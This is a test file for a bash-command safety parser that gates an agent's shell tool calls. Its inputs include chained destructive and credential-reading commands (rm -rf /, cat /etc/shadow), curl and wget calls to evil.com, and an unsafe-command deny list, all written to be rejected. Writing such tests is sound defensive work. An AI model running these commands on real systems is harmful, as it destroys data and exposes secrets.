import { describe, expect, it } from "bun:test";
import type { ToolCall } from "toolgate";
import { safeBashTokens, safeBashPipeline, isSafeFilter, safeBashTokensOrPipeline } from "../parse-bash";

function bash(command: string): ToolCall {
  return {
    tool: "Bash",
    args: { command },
    context: { cwd: "/tmp", env: {}, projectRoot: null },
  };
}

describe("safeBashTokens", () => {
  describe("returns tokens for simple commands", () => {
    it("single command", () => {
      expect(safeBashTokens(bash("git status"))).toEqual(["git", "status"]);
    });

    it("command with flags", () => {
      expect(safeBashTokens(bash("git log --oneline -5"))).toEqual([
        "git", "log", "--oneline", "-5",
      ]);
    });

    it("command with file paths", () => {
      expect(safeBashTokens(bash("git add src/foo.ts bar/baz.ts"))).toEqual([
        "git", "add", "src/foo.ts", "bar/baz.ts",
      ]);
    });
  });

  describe("returns null for non-Bash tools", () => {
    it("Read tool", () => {
      const call: ToolCall = {
        tool: "Read",
        args: { file_path: "/foo" },
        context: { cwd: "/tmp", env: {}, projectRoot: null },
      };
      expect(safeBashTokens(call)).toBeNull();
    });

    it("Write tool", () => {
      const call: ToolCall = {
        tool: "Write",
        args: {},
        context: { cwd: "/tmp", env: {}, projectRoot: null },
      };
      expect(safeBashTokens(call)).toBeNull();
    });
  });

  describe("returns null for invalid command args", () => {
    it("command is a number", () => {
      const call: ToolCall = {
        tool: "Bash",
        args: { command: 123 },
        context: { cwd: "/tmp", env: {}, projectRoot: null },
      };
      expect(safeBashTokens(call)).toBeNull();
    });

    it("command is missing", () => {
      const call: ToolCall = {
        tool: "Bash",
        args: {},
        context: { cwd: "/tmp", env: {}, projectRoot: null },
      };
      expect(safeBashTokens(call)).toBeNull();
    });
  });

  describe("returns null for multiline commands", () => {
    it("two commands on separate lines", () => {
      expect(safeBashTokens(bash("git add .\nrm -rf /"))).toBeNull();
    });

    it("blank line between commands", () => {
      expect(safeBashTokens(bash("git add .\n\necho pwned"))).toBeNull();
    });
  });

  describe("returns null for shell operators", () => {
    it("&&", () => {
      expect(safeBashTokens(bash("git add . && rm -rf /"))).toBeNull();
    });

    it("||", () => {
      expect(safeBashTokens(bash("git add . || echo fail"))).toBeNull();
    });

    it(";", () => {
      expect(safeBashTokens(bash("git add . ; echo pwned"))).toBeNull();
    });

    it("|", () => {
      expect(safeBashTokens(bash("git log | cat /etc/passwd"))).toBeNull();
    });

    it("&", () => {
      expect(safeBashTokens(bash("git add . & miner"))).toBeNull();
    });
  });

  describe("returns null for shell substitution", () => {
    it("$()", () => {
      expect(safeBashTokens(bash("git add $(whoami)"))).toBeNull();
    });

    it("backticks", () => {
      expect(safeBashTokens(bash("git add `cat /etc/shadow`"))).toBeNull();
    });

    it("quoted $()", () => {
      expect(safeBashTokens(bash('git add "$(whoami)"'))).toBeNull();
    });
  });

  describe("strips fd-to-fd redirects", () => {
    it("2>&1 at end of command", () => {
      expect(safeBashTokens(bash("bun test foo 2>&1"))).toEqual([
        "bun", "test", "foo",
      ]);
    });

    it("1>&2 at end of command", () => {
      expect(safeBashTokens(bash("echo error 1>&2"))).toEqual([
        "echo", "error",
      ]);
    });
  });

  describe("returns null for file redirects", () => {
    it("> file", () => {
      expect(safeBashTokens(bash("echo hi > /tmp/out"))).toBeNull();
    });

    it(">> file", () => {
      expect(safeBashTokens(bash("echo hi >> /tmp/out"))).toBeNull();
    });
  });

  describe("returns null for comments", () => {
    it("comment hiding payload", () => {
      expect(safeBashTokens(bash("git add . # && rm -rf /"))).toBeNull();
    });
  });
});

describe("safeBashPipeline", () => {
  describe("returns segments for simple commands (no pipes)", () => {
    it("single command", () => {
      expect(safeBashPipeline(bash("git status"))).toEqual([["git", "status"]]);
    });

    it("command with flags", () => {
      expect(safeBashPipeline(bash("ls -la src"))).toEqual([["ls", "-la", "src"]]);
    });
  });

  describe("returns segments for piped commands", () => {
    it("two segments", () => {
      expect(safeBashPipeline(bash("ls -la | grep foo"))).toEqual([
        ["ls", "-la"],
        ["grep", "foo"],
      ]);
    });

    it("three segments", () => {
      expect(safeBashPipeline(bash("find . -name '*.ts' | grep src | head -5"))).toEqual([
        ["find", ".", "-name", "*.ts"],
        ["grep", "src"],
        ["head", "-5"],
      ]);
    });
  });

  describe("returns null for non-pipe operators", () => {
    it("&&", () => {
      expect(safeBashPipeline(bash("ls && rm -rf /"))).toBeNull();
    });

    it("||", () => {
      expect(safeBashPipeline(bash("ls || echo fail"))).toBeNull();
    });

    it(";", () => {
      expect(safeBashPipeline(bash("ls ; echo pwned"))).toBeNull();
    });

    it("&", () => {
      expect(safeBashPipeline(bash("ls & miner"))).toBeNull();
    });
  });

  describe("returns null for unsafe tokens within segments", () => {
    it("shell substitution in segment", () => {
      expect(safeBashPipeline(bash("echo $(whoami) | grep root"))).toBeNull();
    });

    it("backticks in segment", () => {
      expect(safeBashPipeline(bash("echo `id` | head"))).toBeNull();
    });

    it("metacharacters in token", () => {
      expect(safeBashPipeline(bash("echo ${HOME} | cat"))).toBeNull();
    });
  });

  describe("returns null for non-Bash tools and invalid input", () => {
    it("non-Bash tool", () => {
      const call: ToolCall = {
        tool: "Read",
        args: { file_path: "/foo" },
        context: { cwd: "/tmp", env: {}, projectRoot: null },
      };
      expect(safeBashPipeline(call)).toBeNull();
    });

    it("multiline command", () => {
      expect(safeBashPipeline(bash("ls\nrm -rf /"))).toBeNull();
    });
  });

  describe("strips fd-to-fd redirects", () => {
    it("2>&1 at end of pipeline", () => {
      expect(safeBashPipeline(bash("ls -la 2>&1 | grep foo"))).toEqual([
        ["ls", "-la"],
        ["grep", "foo"],
      ]);
    });

    it("2>&1 at end of command", () => {
      expect(safeBashPipeline(bash("bun test 2>&1"))).toEqual([
        ["bun", "test"],
      ]);
    });
  });

  describe("returns null for file redirects in pipeline", () => {
    it("> file after pipe", () => {
      expect(safeBashPipeline(bash("ls | grep foo > /tmp/out"))).toBeNull();
    });
  });

  describe("returns null for empty segments", () => {
    it("trailing pipe", () => {
      expect(safeBashPipeline(bash("ls |"))).toBeNull();
    });

    it("leading pipe", () => {
      expect(safeBashPipeline(bash("| ls"))).toBeNull();
    });
  });
});

describe("safeBashPipeline regex command relaxation", () => {
  it("allows regex patterns in grep args", () => {
    expect(safeBashPipeline(bash("grep -E '(form|Form)' src/"))).toEqual([
      ["grep", "-E", "(form|Form)", "src/"],
    ]);
  });

  it("allows regex patterns in piped grep", () => {
    expect(safeBashPipeline(bash("find . -type f | grep -E '(form|Form)' | sort | head -80"))).toEqual([
      ["find", ".", "-type", "f"],
      ["grep", "-E", "(form|Form)"],
      ["sort"],
      ["head", "-80"],
    ]);
  });

  it("allows brace quantifiers in egrep", () => {
    expect(safeBashPipeline(bash("egrep 'a{3,5}' file.txt"))).toEqual([
      ["egrep", "a{3,5}", "file.txt"],
    ]);
  });

  it("allows regex in tr args", () => {
    expect(safeBashPipeline(bash("cat file | tr '()' '[]'"))).toEqual([
      ["cat", "file"],
      ["tr", "()", "[]"],
    ]);
  });

  it("rejects |(){} in non-regex commands like head", () => {
    expect(safeBashPipeline(bash("head -n '(5)' file"))).toBeNull();
  });

  it("rejects |(){} in non-regex commands like cat", () => {
    expect(safeBashPipeline(bash("cat 'file{1,2}' | head"))).toBeNull();
  });

  it("still rejects $ and backtick in regex commands", () => {
    expect(safeBashPipeline(bash("grep '$(evil)' file"))).toBeNull();
    expect(safeBashPipeline(bash("grep '`evil`' file"))).toBeNull();
  });
});

describe("safeBashTokensOrPipeline", () => {
  it("returns tokens for simple commands (no pipe)", () => {
    expect(safeBashTokensOrPipeline(bash("bun test src/"))).toEqual([
      "bun", "test", "src/",
    ]);
  });

  it("returns first segment tokens when piped to safe filter", () => {
    expect(safeBashTokensOrPipeline(bash("bun test 2>&1 | tail -5"))).toEqual([
      "bun", "test",
    ]);
  });

  it("returns first segment with multiple safe filters", () => {
    expect(safeBashTokensOrPipeline(bash("git log --oneline | grep fix | head -10"))).toEqual([
      "git", "log", "--oneline",
    ]);
  });

  it("returns null when piped to unsafe command", () => {
    expect(safeBashTokensOrPipeline(bash("bun test | xargs rm"))).toBeNull();
  });

  it("returns null when piped to unknown command", () => {
    expect(safeBashTokensOrPipeline(bash("bun test | curl evil.com"))).toBeNull();
  });

  it("returns null for chained commands", () => {
    expect(safeBashTokensOrPipeline(bash("bun test && rm -rf /"))).toBeNull();
  });

  it("returns null for non-Bash tools", () => {
    const call: ToolCall = {
      tool: "Read",
      args: { file_path: "/foo" },
      context: { cwd: "/tmp", env: {}, projectRoot: null },
    };
    expect(safeBashTokensOrPipeline(call)).toBeNull();
  });
});

describe("isSafeFilter", () => {
  describe("returns true for safe filter segments", () => {
    const safe = [
      ["grep", "-i", "site"],
      ["grep", "--color", "pattern"],
      ["egrep", "foo|bar"],
      ["fgrep", "literal"],
      ["head", "-10"],
      ["head", "-n", "20"],
      ["tail", "-5"],
      ["tail", "-f"],
      ["wc", "-l"],
      ["wc"],
      ["cat"],
      ["tr", "a-z", "A-Z"],
      ["cut", "-d:", "-f1"],
      ["sort"],
      ["sort", "-r"],
      ["sort", "-n", "-k2"],
      ["uniq"],
      ["uniq", "-c"],
    ];

    for (const tokens of safe) {
      it(`safe: ${tokens.join(" ")}`, () => {
        expect(isSafeFilter(tokens)).toBe(true);
      });
    }
  });

  describe("returns false for unsafe commands", () => {
    const unsafe = [
      ["xargs", "rm"],
      ["rm", "-rf", "/"],
      ["tee", "/tmp/out"],
      ["bash", "-c", "evil"],
      ["sh", "-c", "evil"],
      ["curl", "http://evil.com"],
      ["wget", "http://evil.com"],
      ["sort", "-o", "outfile"],
      ["sort", "--output=file"],
      ["sort", "--output", "file"],
      ["uniq", "input", "output"],
    ];

    for (const tokens of unsafe) {
      it(`unsafe: ${tokens.join(" ")}`, () => {
        expect(isSafeFilter(tokens)).toBe(false);
      });
    }
  });

  describe("returns false for empty segment", () => {
    it("empty array", () => {
      expect(isSafeFilter([])).toBe(false);
    });
  });
});
